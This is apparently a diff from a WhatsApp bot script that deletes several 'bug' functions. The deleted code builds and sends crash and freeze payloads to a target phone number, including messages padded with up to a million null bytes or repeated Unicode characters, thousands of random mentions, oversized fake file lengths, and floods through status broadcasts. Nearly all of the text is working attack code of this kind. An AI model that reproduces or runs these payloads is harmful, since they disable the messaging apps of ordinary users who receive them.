⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉".repeat(25000)}","sections":[{"title":"Crash","rows":[]}]}`
-            },
-            {
-              name: "address_message",
-              buttonParamsJson: JSON.stringify({
-                "screen_1_TextInput_0": "radio - buttons" + "\u0000".repeat(250000),
-                "screen_0_Dropdown_1":  "\u0000".repeat(10000),
-                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
-              }),
-              version: 3
-            }
-         ]
-      }
-    }
-  };
-
-    await sock.relayMessage(target, vnxbng, {
-      participant: { jid: target }
-    });
-    
-    console.log(" Cancer Bug Sent to: " + target);
-  } catch (e) {
-    console.log("❌ Error Bug Sending:", e.message || e);
-  }
-}
-
-async function BlankDocumentByMia(client, target) {
-
-    const docPayload = {
-        url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-        fileLength: "9999999999999",
-        pageCount: 9999999999999,
-        mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-        fileName: "hanzXeon.7z",
-        fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-        directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-        mediaKeyTimestamp: "1726867151",
-        contactVcard: true,
-        jpegThumbnail: ""
-    };
-
-    try {
-        const msg = await generateWAMessageFromContent(target, {
-            newsletterAdminInviteMessage: {
-                newsletterJid: "1@newsletter",
-                newsletterName: "𓆩᬴𓆪".repeat(80000),
-                caption: "ꦾ".repeat(80000),
-                inviteCode: "ꦽ".repeat(80000),
-                contextInfo: {
-                    locationMessage: { degreesLatitude: 23045678087, degreesLongitude: 23045678087, name: "galaxy_message" },
-                    forwardingScore: 99999,
-                    isForwarded: true,
-                    quotedMessage: { locationMessage: { degreesLatitude: 91, degreesLongitude: 181, name: "call_permission_request" } },
-                    externalAdReply: {
-                        title: "assalamualaikum",
-                        body: "ꦾ".repeat(80000),
-                        mediaType: 1,
-                        thumbnail: null,
-                        sourceUrl: "",
-                        showAdAttribution: true,
-                        renderLargerThumbnail: true,
-                        locationMessage: { degreesLatitude: 1010101, degreesLongitude: 1010101, name: "single_select" }
-                    }
-                }
-            }
-        }, { forwardingScore: 99999, isForwarded: true, participant: { jid: target } });
-        
-        await client.relayMessage(target, msg.message, { messageId: msg.key.id });
-
-        await client.relayMessage(target, {
-            groupStatusMessageV2: {
-                message: {
-                    interactiveMessage: {
-                        header: { documentMessage: docPayload, hasMediaAttachment: true },
-                        body: { text: "hai" },
-                        nativeFlowMessage: {
-                            buttons: [{ name: "call_permission_request", buttonParamsJson: "\u0000".repeat(950000) }]
-                        },
-                        contextInfo: {
-                            remoteJid: target,
-                            participant: target,
-                            mentionedJid: ["0@s.whatsapp.app", ...Array.from({ length: 1999 }, () => Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
-                            quotedMessage: { documentMessage: docPayload }
-                        }
-                    }
-                }
-            }
-        }, { messageId: null, participant: { jid: target } });
-
-        for (let i = 0; i < 1; i++) {
-            await client.relayMessage(target, {
-                viewOnceMessage: {
-                    message: {
-                        interactiveResponseMessage: {
-                            body: { text: " boleh kenalan? ", format: 1 },
-                            nativeFlowResponseMessage: {
-                                name: "call_permission_request",
-                                paramsJson: JSON.stringify({ status: "ok", title: "𓆩᬴𓆪".repeat(8000) }),
-                                version: 3
-                            },
-                            contextInfo: { mentionedJid: ["13135550002@s.whatsapp.net"] }
-                        }
-                    }
-                }
-            }, { participant: { jid: target } });
-        }
-
-        await client.relayMessage(target, {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        body: { text: "ayo balikan" },
-                        nativeFlowMessage: {
-                            buttons: [{
-                                name: "cta_copy",
-                                buttonParamsJson: JSON.stringify({
-                                    display_text: "ꦾ".repeat(80000),
-                                })
-                            }],
-                            version: 3
-                        }
-                    }
-                }
-            }
-        }, { participant: { jid: target } });
-
-        const msgx = {
-            viewOnceMessage: {  
-                message: {  
-                    interactiveResponseMessage: {  
-                        body: {  
-                            text: " hidup kacau kita kicaukan ",  
-                            hasMediaAttachment: false  
-                        },  
-                        imageMessage: {  
-                            url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",  
-                            mimetype: "image/jpeg",  
-                            fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",  
-                            fileLength: "11887",  
-                            height: 1080,  
-                            width: 1080,  
-                            mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",  
-                            fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",  
-                            directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",  
-                            mediaKeyTimestamp: "1750124469",  
-                            contextInfo: {  
-                                forwardingScore: 9999,  
-                                isForwarded: true,  
-                                mentionedJid: [  
-                                    "0@s.whatsapp.net",  
-                                    ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")  
-                                ],  
-                                expiration: 9741,  
-                                ephemeralSettingTimestamp: 9741,  
-                                entryPointConversionSource: "WhatsApp.com",  
-                                entryPointConversionApp: "WhatsApp",  
-                                entryPointConversionDelaySeconds: 9742,  
-                                disappearingMode: {  
-                                    initiator: "INITIATED_BY_OTHER",  
-                                    trigger: "ACCOUNT_SETTING"  
-                                }  
-                            },  
-                            scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",  
-                            scanLengths: [2071, 6199, 1634, 1983],  
-                            midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="  
-                        },  
-                        nativeFlowResponseMessage: {  
-                            name: "address_message",  
-                            paramsJson: "\u0000".repeat(1045900),  
-                            version: 3  
-                        }  
-                    }  
-                }  
-            }  
-        };
-
-        const hanzz = await generateWAMessageFromContent(target, msgx, {});
-
-        await client.relayMessage("status@broadcast", hanzz.message, {
-            messageId: hanzz.key.id,
-            statusJidList: [target],
-            additionalNodes: [{
-                tag: "meta",
-                attrs: {},
-                content: [{
-                    tag: "mentioned_users",
-                    attrs: {},
-                    content: [{
-                        tag: "to",
-                        attrs: { jid: target },
-                        content: undefined
-                    }]
-                }]
-            }]
-        });
-
-        console.log(`sukses send to ${target}`);
-
-    } catch(e) {
-        console.log(`error: ${e.message}`);
-    }
-}
-
-async function SuperSlowDelayByMia(sock, jid) {
-  for (let i = 0; i < 25; i++) {
-    const msg = generateWAMessageFromContent(jid, {
-      imageMessage: {
-         url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
-         mimetype: "image/jpeg",
-         caption: "segini doang berani nyenggol dric?",
-         fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
-         fileLength: "999999999",
-         height: 354,
-         width: 783,
-         mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
-         fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
-         directPath:
-            "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
-         mediaKeyTimestamp: "1743225419",
-         jpegThumbnail: null,
-         scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
-         scanLengths: [2437, 17332],
-         contextInfo: {
-           urlTrackingMap: {
-               urlTrackingMapElements: Array.from(
-                 { length: 500000 },
-                 () => ({ "\0": "\0" })
-               )
-            }, 
-           isSampled: true,
-           participant: jid,
-           remoteJid: "status@broadcast",
-           forwardingScore: 9999,
-           isForwarded: true,
-         },
-       },
-    }, {});
-    
-    await sock.relayMessage("status@broadcast", msg.message, {
-      messageId: msg.key.id, statusJidList: [jid], additionalNodes: [{
-        tag: "meta", attrs: {}, content: [{
-          tag: "mentioned_users", attrs: {}, content: [{
-            tag: "to", attrs: { jid: jid }, content: undefined
-          }]
-        }]
-      }]
-    });
-  }
-  
-  const msgs = generateWAMessageFromContent(jid, {
-    interactiveResponseMessage: {
-      body: {
-        text: "Segini doang berani nyenggol dric?", 
-        format: "DEFAULT"
-      }, 
-      nativeFlowResponseMessage: {
-        name: "call_permission_request", 
-        paramsJson: "\u0000".repeat(999999), 
-        version: 3
-      }, 
-      contextInfo: {
-        mentionedJid: [
-          "13135550002@s.whatsapp.net", 
-          ...Array.from({ length: 2000 }, () => 1 + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
-          )
-        ], 
-        groupMentions: [],
-        entryPointConversionSource: "non_contact",
-        entryPointConversionApp: "whatsapp",
-        entryPointConversionDelaySeconds: 467593,
-      }
-    }
-  }, {});
-  
-  await sock.relayMessage("status@broadcast", msgs.message, {
-      messageId: msgs.key.id, statusJidList: [jid], additionalNodes: [{
-        tag: "meta", attrs: {}, content: [{
-          tag: "mentioned_users", attrs: {}, content: [{
-            tag: "to", attrs: { jid: jid }, content: undefined
-          }]
-        }]
-      }]
-   });
-}
-
-async function SuperDelayByMia(sock, target) {
-  await sock.relayMessage(
-    target,
-    {
-  groupStatusMessageV2: { 
-    message: {
-      interactiveResponseMessage: {
-        body: {
-          text: "Tunduk Didalam Kekuasaan Cancer",
-          format: "DEFAULT",
-        },
-        nativeFlowResponseMessage: {
-          name: "payment_method",
-                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(9000)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
-          version: 3
-        },
-        contextInfo: {
-          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
-          isForwarded: true,
-          forwardingScore: 9999,
-          statusAttributionType: 2,
-            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
-              participant: `62${n + 836598}@s.whatsapp.net`,
-              type: 1
-            })),
-        },
-      },
-    },
-  },
-}, { participant: { jid: target }});
-}
 // ~ End Function Bugs ~ \\
 // ==================
 // GLOBAL ERROR HANDLER (SAFE)
